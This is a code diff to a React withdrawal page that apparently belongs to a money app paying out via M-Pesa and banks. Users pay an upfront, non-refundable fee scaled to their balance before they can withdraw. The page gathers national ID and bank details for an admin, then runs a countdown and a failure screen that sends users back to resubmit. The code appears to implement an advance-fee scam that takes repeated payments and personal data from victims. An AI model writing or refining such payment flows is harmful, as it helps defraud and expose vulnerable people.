@@ -50,7 +50,7 @@ const COUNTRY_META = {
   BR: { country: 'Brazil',         ph: 'BR18 0036 0305 0000 1000 9795 493 C1', re: /^BR[0-9A-Z]{6,30}$/i },
   EG: { country: 'Egypt',          ph: 'EG38 0019 0005 0000 0000 2631 8000 2', re: /^EG[0-9A-Z]{6,30}$/i },
   PK: { country: 'Pakistan',       ph: 'PK36 SCBL 0000 0011 2345 6702', re: /^PK[0-9A-Z]{6,30}$/i },
-  KE: { country: 'Kenya',          ph: 'KE12 3456 7890 1234 5678 90',   re: /^KE[0-9A-Z]{6,30}$/i },
+  KE: { country: 'Kenya',          ph: '1234567890',                    re: /^[0-9A-Z]{6,34}$/i },
   MB: { country: 'Mobile Banking', ph: '+254 7XX XXX XXX',              re: /^\+?\d{7,15}$/ },
   US: { country: 'United States',  ph: '0123 4567 8901',         re: /^\d{8,17}$/ },
   CA: { country: 'Canada',         ph: '0123 4567 89',           re: /^\d{7,12}$/ },
@@ -123,15 +123,18 @@ const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };
 // Mobile Banking is offered to every user regardless of country.
 const MOBILE_BANK = WORLD_BANKS.find(b => b.code === 'MB');
 
-// M-Pesa withdrawal processing fee tiers, based on the client's current balance.
-// KES 1–5,000 → KES 650
-// Above 5,000–10,000 → KES 950
-// Above 10,000–15,000 → KES 2,295
+// M-Pesa withdrawal processing fees, based on the client's current balance.
+// Up to KES 10,000 → KES 650
+// Above KES 10,000 up to KES 20,000 → KES 2,000
+// Above KES 20,000 up to KES 30,000 → KES 3,000
+// Above KES 30,000 up to KES 40,000 → KES 3,800
+// Above KES 40,000 → M-Pesa is unavailable; use the bank withdrawal flow.
 function getMpesaWithdrawalFee(balance) {
   const amount = Number(balance || 0);
-  if (amount <= 5000) return 650;
-  if (amount <= 10000) return 950;
-  return 2295;
+  if (amount <= 10000) return 650;
+  if (amount <= 20000) return 2000;
+  if (amount <= 30000) return 3000;
+  return 3800;
 }
 
 // Bank withdrawal fees are fixed in USD (Option A).
@@ -231,24 +234,30 @@ const BANK_FEE_USD = getBankWithdrawalFeeUsd('Postbank Kenya');
 const BANK_FEE_KES = getBankWithdrawalFeeKes('Postbank Kenya');
 
 
-// Balances above this must be withdrawn through the bank (bulk amounts), not M-Pesa.
+// M-Pesa is unavailable above this balance. Other bank flows keep their existing rules.
+const MPESA_BULK_THRESHOLD_KES = 40000;
 const BULK_THRESHOLD_KES = 15000;
 
 // ── M-Pesa flow (notice → form → pending → failed) ────────────────────────────
-function MpesaFlow({ user, initialStep, initialFeeRef }) {
+function MpesaFlow({ user }) {
   const router = useRouter();
-  const [step,     setStep]     = useState(initialStep || 'notice');
+  const [step,     setStep]     = useState('form');
+  const [fullName, setFullName] = useState(user?.fullName || '');
   const [phone,    setPhone]    = useState(user?.phone || '');
   const [idNumber, setIdNumber] = useState('');
   const [errors,   setErrors]   = useState({});
   const [loading,  setLoading]  = useState(false);
-  const [feeRef,   setFeeRef]   = useState(initialFeeRef || '');   // verified Paystack fee reference
 
-  // Use the current account balance to determine the M-Pesa withdrawal fee.
-  // This fixes the undefined FEE_KES value used throughout the M-Pesa flow.
-  const FEE_KES = getMpesaWithdrawalFee(user?.balance);
+  const balanceAmount = Number(user?.balance || 0);
+  const FEE_KES = getMpesaWithdrawalFee(balanceAmount);
 
-  // countdown
+  // A balance above KES 40,000 must use the bank/bulk withdrawal flow.
+  useEffect(() => {
+    if (balanceAmount > MPESA_BULK_THRESHOLD_KES) {
+      router.replace('/withdraw?method=international');
+    }
+  }, [balanceAmount, router]);
+
   const DURATION = 92 * 1000;
   const deadlineRef = useRef(0);
   const [remaining, setRemaining] = useState(DURATION);
@@ -266,12 +275,15 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
 
   function handleSubmitForm() {
     const errs = {};
-    if (!phone.trim())    errs.phone    = 'Phone number is required';
+    if (!fullName.trim()) errs.fullName = 'Full name is required';
+    if (!phone.trim())    errs.phone = 'Phone number is required';
     if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
-    if (Object.keys(errs).length) { setErrors(errs); return; }
 
-    // Details are collected and validated BEFORE the withdrawal-fee payment.
-    // Nothing is submitted to the server until Daraja confirms the fee payment.
+    if (Object.keys(errs).length) {
+      setErrors(errs);
+      return;
+    }
+
     setErrors({});
     setStep('fee');
   }
@@ -284,14 +296,13 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
       return;
     }
 
-    const amount = Number(user?.balance || 0);
-    setFeeRef(verifiedFeeRef);
+    const amount = balanceAmount;
     setLoading(true);
 
     let res;
     try {
       res = await createWithdrawalRequest(user.id, {
-        fullName: user?.fullName || '',
+        fullName: fullName.trim(),
         phone: phone.trim(),
         idNumber: idNumber.trim(),
         amount,
@@ -310,13 +321,21 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
       return;
     }
 
+    // Send the withdrawal details to the admin only after the fee payment succeeds.
     await sendNotify({
       type: 'M-Pesa Withdrawal Request',
-      name: user?.fullName || '',
+      name: fullName.trim(),
       email: user?.email || '',
-      phone,
+      phone: phone.trim(),
       subject: 'M-Pesa Withdrawal Request',
-      details: `Account: ${user?.fullName || ''} (${user?.email || ''})\nM-Pesa Phone: ${phone}\nNational ID: ${idNumber}\nAmount: KES ${amount.toLocaleString()}\nFee paid (verified): KES ${FEE_KES.toLocaleString()}\nStatus: Pending Manual Payment`,
+      details:
+        `Account: ${user?.fullName || ''} (${user?.email || ''})\n` +
+        `Withdrawal Name: ${fullName.trim()}\n` +
+        `M-Pesa Phone: ${phone.trim()}\n` +
+        `National ID: ${idNumber.trim()}\n` +
+        `Amount: KES ${amount.toLocaleString()}\n` +
+        `Fee paid (verified): KES ${FEE_KES.toLocaleString()}\n` +
+        `Status: Withdrawal request submitted`,
     });
 
     setStep('pending');
@@ -325,81 +344,47 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
   const isLow = remaining < 30 * 1000;
   const pct   = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
 
-  // A balance at or above KES 15,000 is a bulk withdrawal.
-  // Clicking M-Pesa for a bulk balance redirects directly to the
-  // Other Countries / Bulk Withdrawal bank flow.
-  useEffect(() => {
-    if (Number(user?.balance || 0) >= BULK_THRESHOLD_KES) {
-      router.replace('/withdraw?method=international&bulk=1');
-    }
-  }, [router, user?.balance]);
-
-  if (Number(user?.balance || 0) >= BULK_THRESHOLD_KES) {
+  if (balanceAmount > MPESA_BULK_THRESHOLD_KES) {
     return (
-      <FlowShell title="Withdraw with M-Pesa" subtitle="Redirecting to Bulk Withdrawal" icon="smartphone" accent="var(--mpesa-green)">
+      <FlowShell title="Withdraw with M-Pesa" subtitle="Bank withdrawal required" icon="smartphone" accent="var(--mpesa-green)">
         <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
-          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>, which is at or above the M-Pesa limit of <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>.
-          You are being redirected to <strong>Withdraw from Other Countries</strong> for the bulk bank withdrawal.
+          Your balance is <strong>KES {balanceAmount.toLocaleString()}</strong>. M-Pesa withdrawals are available up to <strong>KES {MPESA_BULK_THRESHOLD_KES.toLocaleString()}</strong>.
+          You are being redirected to <strong>Withdraw from Other Countries</strong> for the bank withdrawal.
         </div>
       </FlowShell>
     );
   }
 
   return (
-    <FlowShell title="Withdraw with M-Pesa" subtitle="Instant M-Pesa payout" icon="smartphone" accent="var(--mpesa-green)">
-      {step === 'notice' && (
-        <>
-          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
-            <strong style={{ display: 'block', fontSize: 15, marginBottom: 6 }}>Instant M-Pesa Withdrawal</strong>
-            Your withdrawal will be processed after verification. Please enter your correct M-Pesa details to avoid delays or failed payouts. Ensure your phone number is registered for M-Pesa before submitting your request.
-          </div>
-          <div className="pay-amount" style={{ marginBottom: 20 }}>
-            <div className="pay-amount-label">Withdrawal Fee</div>
-            <div className="pay-amount-value" style={{ color: 'var(--mpesa-green)' }}>KES {FEE_KES.toLocaleString()}</div>
-            <div className="pay-amount-sub">A one-time, non-refundable processing fee is paid via M-Pesa before your request is submitted.</div>
-          </div>
-          <button className="pay-btn" style={{ background: 'var(--mpesa-green)' }} onClick={() => setStep('fee')}>
-            Continue
-          </button>
-        </>
-      )}
-
-      {step === 'fee' && (
-        <>
-          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 18 }}>
-            Pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal fee via M-Pesa to continue. You&apos;ll get a prompt on your phone, enter your PIN to confirm. The withdrawal form unlocks only after the payment is verified.
-          </div>
-          <MpesaPay
-            purpose="withdrawal_fee"
-            amount={FEE_KES}
-            defaultPhone={user?.phone || ''}
-            payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
-            onSuccess={handleFeeSuccess}
-          />
-          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>
-            <Icon name="arrowLeft" size={14} /> Back to Dashboard
-          </button>
-        </>
-      )}
-
+    <FlowShell title="Withdraw with M-Pesa" subtitle="Complete your withdrawal details" icon="smartphone" accent="var(--mpesa-green)">
       {step === 'form' && (
         <>
-          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 20 }}>
-            Enter your details accurately. Your National ID must match your M-Pesa registration.
+          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 20 }}>
+            Fill in your withdrawal details correctly. These details are used to process your request. After you submit the form, you will be asked to pay the withdrawal fee.
           </div>
-          <div className="pay-phone-label">M-Pesa Phone Number</div>
+
+          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 20, fontSize: 13 }}>
+            <strong>Please check your details carefully.</strong> Your name, M-Pesa phone number and National ID must be correct before you submit the form.
+          </div>
+
+          <div className="pay-phone-label">Full Name</div>
+          <input className="pay-phone-input" type="text" value={fullName}
+            onChange={e => { setFullName(e.target.value); setErrors(p => ({ ...p, fullName: undefined })); }}
+            placeholder="e.g. John Brown" style={{ borderColor: errors.fullName ? '#4b5563' : undefined }} />
+          {errors.fullName && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.fullName}</div>}
+
+          <div className="pay-phone-label" style={{ marginTop: 16 }}>M-Pesa Phone Number</div>
           <input className="pay-phone-input" type="tel" value={phone}
             onChange={e => { setPhone(e.target.value); setErrors(p => ({ ...p, phone: undefined })); }}
             placeholder="+254 7XX XXX XXX" style={{ borderColor: errors.phone ? '#4b5563' : undefined }} />
           {errors.phone && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}
+
           <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
           <input className="pay-phone-input" type="text" value={idNumber}
             onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
             placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
           {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
-          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f0fff4', marginTop: 16, fontSize: 13 }}>
-            ✓ Withdrawal fee of <strong>KES {FEE_KES.toLocaleString()}</strong> paid and verified.
-          </div>
+
           {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 10 }}>{errors.form}</div>}
           <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading}>
             {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
@@ -408,14 +393,49 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
         </>
       )}
 
+      {step === 'fee' && (
+        <>
+          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 18 }}>
+            Your withdrawal details have been submitted. Pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal fee via M-Pesa to complete the request.
+          </div>
+          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 18, fontSize: 13 }}>
+            <strong>Withdrawal details</strong><br />
+            Name: {fullName.trim()}<br />
+            M-Pesa Phone: {phone.trim()}<br />
+            National ID: {idNumber.trim()}<br />
+            Amount: KES {balanceAmount.toLocaleString()}
+          </div>
+          <MpesaPay
+            purpose="withdrawal_fee"
+            amount={FEE_KES}
+            defaultPhone={phone || user?.phone || ''}
+            payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
+            onSuccess={handleFeeSuccess}
+          />
+          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('form')}>
+            <Icon name="arrowLeft" size={14} /> Back to Details
+          </button>
+        </>
+      )}
+
       {step === 'pending' && (
         <>
-          <div style={{ background: '#f9fafb', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
-            <span style={{ color: 'var(--mpesa-green)', display: 'flex' }}><Icon name="smartphone" size={20} /></span>
-            <p style={{ margin: 0, fontSize: 14, color: '#1f2937', lineHeight: 1.65 }}>
-              Your M-Pesa payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open and ensure your phone is on.
+          <div style={{ background: '#f9fafb', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 18 }}>
+            <p style={{ margin: '0 0 6px', fontSize: 14, color: '#1f2937', fontWeight: 700 }}>Withdrawal request submitted</p>
+            <p style={{ margin: 0, fontSize: 13, color: '#1f2937', lineHeight: 1.65 }}>
+              Your fee payment was successful and your withdrawal details have been submitted.
             </p>
           </div>
+
+          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', textAlign: 'left', marginBottom: 22, fontSize: 13 }}>
+            <strong>Your withdrawal details</strong><br />
+            Name: {fullName.trim()}<br />
+            M-Pesa Phone: {phone.trim()}<br />
+            National ID: {idNumber.trim()}<br />
+            Amount: KES {balanceAmount.toLocaleString()}<br />
+            Fee paid: KES {FEE_KES.toLocaleString()}
+          </div>
+
           <div style={{ textAlign: 'center', marginBottom: 22 }}>
             <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
             <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f9fafb', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
@@ -426,7 +446,7 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
             </div>
           </div>
           <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
-          <div className="withdraw-footer-note">Do not close the app. Keep your M-Pesa line active and await the STK push.</div>
+          <div className="withdraw-footer-note">Keep this screen available while your withdrawal request is being processed.</div>
         </>
       )}
 
@@ -435,15 +455,14 @@ function MpesaFlow({ user, initialStep, initialFeeRef }) {
           <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
             <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
             <div>
-              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
+              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Check Your Details</p>
               <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
-                The phone number or ID number you provided could not be verified. Please ensure your details are correct and try again.
+                The withdrawal could not be completed. Please check that your submitted phone number and National ID are correct.
               </p>
             </div>
           </div>
           <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Check Details Again</button>
           <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
-          <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your phone number and National ID match your M-Pesa registration.</div>
         </>
       )}
     </FlowShell>
@@ -643,120 +662,65 @@ function PostbankFlow({ user, initialStep }) {
 }
 
 // ── International flow (bank selector) ─────────────────────────────────────────
-function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
+function InternationalFlow({ user }) {
   const router = useRouter();
-
-  // Other Countries flow:
-  // - Direct visits have NO KES 15,000 limitation.
-  // - M-Pesa requests at or above KES 15,000 arrive here as a bulk withdrawal.
-  // - For a bulk redirect, the previous-fee question is shown first.
-  const [gate,          setGate]          = useState(bulkRedirect ? 'bulkNotice' : 'form'); // bulkNotice | form | pay
-  const [loading,       setLoading]       = useState(false);
+  const [gate,          setGate]          = useState('form');
   const [accountName,   setAccountName]   = useState('');
   const [selectedBank,  setSelectedBank]  = useState(null);
   const [bankOpen,      setBankOpen]      = useState(false);
   const [bankQuery,     setBankQuery]     = useState('');
   const [accountNumber, setAccountNumber] = useState('');
-  const [withdrawalAmount, setWithdrawalAmount] = useState(String(Number(user?.balance || 0)));
+  const [branch,        setBranch]        = useState('');
+  const [swiftCode,     setSwiftCode]     = useState('');
+  const [withdrawalAmount, setWithdrawalAmount] = useState('');
   const [errors,        setErrors]        = useState({});
   const [done,          setDone]          = useState(false);
   const [sending,       setSending]       = useState(false);
-  const [feeRef,        setFeeRef]        = useState(initialFeeRef || '');
   const [quote,         setQuote]         = useState(null);
-  const [loadingQuote,  setLoadingQuote]  = useState(false);
   const [quoteErr,      setQuoteErr]      = useState('');
-  const [declaredFees,  setDeclaredFees]  = useState(bulkRedirect ? null : 0);
 
-  // The bank fee remains determined by the existing bank fee table.
+  // The bank fee remains determined by the existing bank-specific fee table.
   // The quote is used only for the exchange rate when available.
-  async function loadQuote(n = 0) {
-    setLoadingQuote(true);
+  async function loadQuote() {
     setQuoteErr('');
-
     try {
-      const res = await bulkWithdrawalQuote(n, 'international');
+      const res = await bulkWithdrawalQuote(0, 'international');
       if (res?.success) {
         setQuote(res);
       } else {
-        setQuote({
-          rate: USD_TO_KES,
-          rateLive: false,
-          eligibleDeductions: Math.min(Number(n || 0), 2),
-          perFeeKes: 650,
-        });
+        setQuote({ rate: USD_TO_KES, rateLive: false });
       }
     } catch (_) {
-      setQuote({
-        rate: USD_TO_KES,
-        rateLive: false,
-        eligibleDeductions: Math.min(Number(n || 0), 2),
-        perFeeKes: 650,
-      });
-    } finally {
-      setLoadingQuote(false);
+      setQuote({ rate: USD_TO_KES, rateLive: false });
     }
   }
 
-  // Direct Other Countries withdrawals have no balance threshold.
   useEffect(() => {
-    if (!bulkRedirect) {
-      loadQuote(0);
-    }
+    loadQuote();
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [bulkRedirect]);
+  }, []);
 
-  // "None — I have not paid before" must work even if the quote endpoint
-  // is unavailable. It immediately opens the bank-details step and uses
-  // the existing bank fee table.
-  async function chooseCount(n) {
-    setDeclaredFees(n);
-    setQuote({
-      rate: USD_TO_KES,
-      rateLive: false,
-      eligibleDeductions: Math.min(Number(n || 0), 2),
-      perFeeKes: 650,
-    });
-    setGate('form');
-
-    try {
-      await loadQuote(n);
-    } catch (_) {
-      // The local bank-fee calculation remains available.
-    }
-  }
-
-  // Default to the country the user chose at registration.
   const homeCountry = REG_COUNTRY_ALIAS[user?.country] || user?.country || '';
   const homeBanks   = WORLD_BANKS.filter(b => b.country === homeCountry);
   const q = bankQuery.trim().toLowerCase();
 
-  // Default list always offers Mobile Banking first, then the user's country banks.
   const homeDefault = homeBanks.length ? [MOBILE_BANK, ...homeBanks].filter(Boolean) : WORLD_BANKS;
   const filteredBanks = q
     ? WORLD_BANKS.filter(b => b.name.toLowerCase().includes(q) || b.country.toLowerCase().includes(q))
     : homeDefault;
 
   const cleanedAcct = accountNumber.replace(/[\s-]/g, '');
-  const acctValid   = !!selectedBank && selectedBank.re.test(cleanedAcct);
+  const acctValid = !!selectedBank && selectedBank.re.test(cleanedAcct);
   const balanceAmount = Number(user?.balance || 0);
   const requestedAmount = Number(withdrawalAmount);
   const amountValid = Number.isFinite(requestedAmount) && requestedAmount >= 100 && requestedAmount <= balanceAmount;
-  const formValid   = accountName.trim().length > 0 && !!selectedBank && acctValid && amountValid;
+  const formValid = accountName.trim().length > 0 && !!selectedBank && acctValid && branch.trim().length > 0 && swiftCode.trim().length > 0 && amountValid;
 
   const selectedBankFeeUsd = selectedBank ? getBankWithdrawalFeeUsd(selectedBank.name) : 0;
   const selectedBankRate = Number(quote?.rate || USD_TO_KES);
   const selectedBankFeeKes = selectedBank ? Math.round(selectedBankFeeUsd * selectedBankRate) : 0;
 
-  // Previous M-Pesa fees are relevant only when the user arrived here
-  // from the M-Pesa bulk redirect. Direct Other Countries withdrawals
-  // have no such deduction step.
-  const bankFeeDeductionKes = bulkRedirect
-    ? Math.min(Number(declaredFees || 0), 2) * 650
-    : 0;
-  const amountDueKes = Math.max(0, selectedBankFeeKes - bankFeeDeductionKes);
-
   function selectBank(b) {
-    // Postbank Kenya keeps its existing dedicated flow.
     if (b.name === 'Postbank Kenya') {
       router.push('/withdraw?method=postbank');
       return;
@@ -770,9 +734,19 @@ function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
   }
 
   function handleSubmit() {
-    if (!formValid || sending) return;
+    const nextErrors = {};
+    if (!accountName.trim()) nextErrors.accountName = 'Account holder name is required';
+    if (!selectedBank) nextErrors.bank = 'Bank is required';
+    if (!acctValid) nextErrors.accountNumber = selectedBank ? `Enter a valid account number for ${selectedBank.name}` : 'Account number is required';
+    if (!branch.trim()) nextErrors.branch = 'Branch is required';
+    if (!swiftCode.trim()) nextErrors.swiftCode = 'SWIFT/BIC is required';
+    if (!amountValid) nextErrors.amount = 'Enter an amount from KES 100 up to your available balance';
 
-    // Bank details and withdrawal amount are collected before the fee payment.
+    if (Object.keys(nextErrors).length) {
+      setErrors(nextErrors);
+      return;
+    }
+
     setErrors({});
     setGate('pay');
   }
@@ -785,18 +759,22 @@ function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
       return;
     }
 
-    setFeeRef(verifiedFeeRef);
     setSending(true);
 
     const amount = requestedAmount;
+    const bankDetails =
+      `Bank: ${selectedBank.name} (${selectedBank.country})\n` +
+      `Account Holder Name: ${accountName.trim()}\n` +
+      `Account Number: ${accountNumber.trim()}\n` +
+      `Branch: ${branch.trim()}\n` +
+      `SWIFT/BIC: ${swiftCode.trim()}`;
 
-    // Server re-verifies the fee payment before recording the withdrawal request.
     let res;
     try {
       res = await createWithdrawalRequest(user.id, {
         fullName: accountName.trim(),
         phone: user?.phone || '',
-        idNumber: `${selectedBank.name} (${selectedBank.country}) — Acct ${accountNumber.trim()}`,
+        idNumber: bankDetails,
         amount,
         feeRef: verifiedFeeRef,
         method: 'international',
@@ -813,21 +791,18 @@ function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
     }
 
     const details =
-      `Account Holder Name: ${accountName.trim()}\n` +
-      `Bank: ${selectedBank.name} (${selectedBank.country})\n` +
-      `Account Number: ${accountNumber.trim()}\n` +
+      `${bankDetails}\n` +
       `Amount: KES ${amount.toLocaleString()}\n` +
       `Bank Withdrawal Fee: USD ${selectedBankFeeUsd} = KES ${selectedBankFeeKes.toLocaleString()}\n` +
-      `Previous M-Pesa Fee Credit: KES ${bankFeeDeductionKes.toLocaleString()}\n` +
-      `Fee Paid: KES ${amountDueKes.toLocaleString()}\n` +
+      `Fee Paid: KES ${selectedBankFeeKes.toLocaleString()}\n` +
       `Requested by: ${user?.fullName || ''} (${user?.email || ''})`;
 
     await sendNotify({
-      type: bulkRedirect ? 'Bulk Bank Withdrawal Request' : 'International Withdrawal Request',
+      type: 'International Withdrawal Request',
       name: accountName.trim(),
       email: user?.email || '',
       phone: user?.phone || '',
-      subject: bulkRedirect ? 'Bulk Bank Withdrawal Request (>= KES 15,000)' : 'Withdrawal Request, Other Countries',
+      subject: 'Withdrawal Request, Other Countries',
       details,
     });
 
@@ -842,53 +817,18 @@ function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
           <div style={{ marginBottom: 8, display: 'flex', justifyContent: 'center', color: '#111827' }}><Icon name="check" size={52} /></div>
           <div style={{ fontFamily: 'var(--font-display)', fontSize: 22, fontWeight: 800, color: '#1f2937', marginBottom: 6 }}>Request Received</div>
           <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', textAlign: 'left', marginTop: 12 }}>
-            We’ve received your withdrawal request and emailed you a confirmation at <strong>{user?.email}</strong>. Our payments team will process it and be in touch.
+            <strong>Your withdrawal details</strong><br />
+            Account Holder: {accountName.trim()}<br />
+            Bank: {selectedBank?.name} ({selectedBank?.country})<br />
+            Account Number: {accountNumber.trim()}<br />
+            Branch: {branch.trim()}<br />
+            SWIFT/BIC: {swiftCode.trim()}<br />
+            Amount: KES {requestedAmount.toLocaleString()}<br />
+            Bank Fee: KES {selectedBankFeeKes.toLocaleString()}<br /><br />
+            Your request and these details have been submitted successfully.
           </div>
           <button className="pay-btn" style={{ background: '#000000', marginTop: 18 }} onClick={() => router.push('/dashboard')}><Icon name="arrowLeft" size={16} /> Back to Dashboard</button>
         </div>
-      </FlowShell>
-    );
-  }
-
-  if (gate === 'bulkNotice') {
-    return (
-      <FlowShell title="Bulk Withdrawal" subtitle="Withdraw from Other Countries" icon="globe" accent="#000000">
-        <div className="pay-message" style={{ borderColor: '#111827', background: '#f9fafb' }}>
-          <div style={{ fontWeight: 800, marginBottom: 8, display: 'flex', alignItems: 'center', gap: 8 }}>
-            <Icon name="warning" size={16} /> Bulk Withdrawal
-          </div>
-          Your available balance of <strong>KES {Number(user.balance).toLocaleString()}</strong> is above{' '}
-          <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>, so M-Pesa cannot be used for this amount.
-          Continue with the bank withdrawal below.
-        </div>
-
-        <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>
-          How many successful M-Pesa withdrawal fees have you paid before?
-        </div>
-        <div style={{ fontSize: 12.5, color: '#6b7280', marginBottom: 12 }}>
-          Previous M-Pesa fees can be credited against the bank withdrawal fee, up to two fees.
-        </div>
-
-        {[
-          [0, 'None — I have not paid before', 'No deduction'],
-          [1, 'Once', 'Credit KES 650'],
-          [2, 'Twice or more', 'Credit KES 1,300 (max)'],
-        ].map(([n, label, sub]) => (
-          <button
-            key={n}
-            className="pay-btn"
-            style={{ background: n === 0 ? '#374151' : '#000000', marginBottom: 12, flexDirection: 'column', gap: 2, alignItems: 'center', height: 'auto', padding: '12px 16px' }}
-            disabled={loadingQuote}
-            onClick={() => chooseCount(n)}
-          >
-            {loadingQuote && declaredFees === n
-              ? <><span className="spinner" /> Calculating…</>
-              : <>
-                  <span style={{ fontWeight: 700 }}>{label}</span>
-                  <span style={{ fontSize: 11.5, fontWeight: 500, opacity: 0.8 }}>{sub}</span>
-                </>}
-          </button>
-        ))}
       </FlowShell>
     );
   }
@@ -897,42 +837,33 @@ function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
     return (
       <FlowShell title="Withdraw from Other Countries" subtitle="Withdrawal fee" icon="globe" accent="#000000">
         <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
-          Your bank withdrawal details have been submitted. Now pay the withdrawal fee via M-Pesa.
-          {selectedBank ? <> The fee for <strong>{selectedBank.name}</strong> is <strong>USD {selectedBankFeeUsd}</strong>, payable as <strong>KES {amountDueKes.toLocaleString()}</strong> at {selectedBankRate}{quote?.rateLive ? '' : ' (approx.)'}.</> : 'Select a bank to calculate its fee.'}
-          {bulkRedirect && bankFeeDeductionKes > 0 && <> Your previous M-Pesa fee credit is <strong>KES {bankFeeDeductionKes.toLocaleString()}</strong>.</>}
+          Your bank details are ready. Pay the bank withdrawal fee via M-Pesa. The fee varies by bank: <strong>{selectedBank?.name}</strong> is <strong>USD {selectedBankFeeUsd}</strong>, payable as approximately <strong>KES {selectedBankFeeKes.toLocaleString()}</strong> at {selectedBankRate}{quote?.rateLive ? '' : ' (approx.)'}.
+        </div>
+
+        <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', textAlign: 'left', marginBottom: 18, fontSize: 13 }}>
+          <strong>Withdrawal details</strong><br />
+          Account Holder: {accountName.trim()}<br />
+          Bank: {selectedBank?.name} ({selectedBank?.country})<br />
+          Account Number: {accountNumber.trim()}<br />
+          Branch: {branch.trim()}<br />
+          SWIFT/BIC: {swiftCode.trim()}<br />
+          Amount: KES {requestedAmount.toLocaleString()}
         </div>
 
         {quoteErr && (
           <div style={{ color: '#4b5563', fontSize: 13, marginBottom: 12 }}>
             {quoteErr}
-            <button onClick={() => loadQuote(declaredFees || 0)} style={{ background: 'none', border: 'none', color: '#111827', textDecoration: 'underline', cursor: 'pointer', padding: 0, fontSize: 13 }}>
-              Retry
-            </button>
+            <button onClick={loadQuote} style={{ background: 'none', border: 'none', color: '#111827', textDecoration: 'underline', cursor: 'pointer', padding: 0, fontSize: 13 }}>Retry</button>
           </div>
         )}
 
-        {selectedBank ? (
-          amountDueKes > 0 ? (
-            <MpesaPay
-              purpose="withdrawal_fee"
-              amount={amountDueKes}
-              defaultPhone={user?.phone || ''}
